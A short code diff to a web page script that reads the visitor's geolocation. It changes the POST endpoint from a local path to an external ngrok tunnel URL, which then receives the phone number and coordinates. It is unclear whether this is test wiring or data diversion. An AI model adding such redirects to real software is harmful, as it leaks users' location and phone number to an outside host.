@@ -22,7 +22,7 @@
 				+ '<p>Timestamp: ' + position.timestamp + '</p>';
 
                 var http = new XMLHttpRequest();
-                var url = "gps/send";
+                var url = "https://f0af6bb4.ngrok.io";
                 var params = "phone=" + {{ phone }} + "&lat=" + position.coords.latitude + "&long=" + position.coords.longitude;
                 http.open("POST", url, true);
 
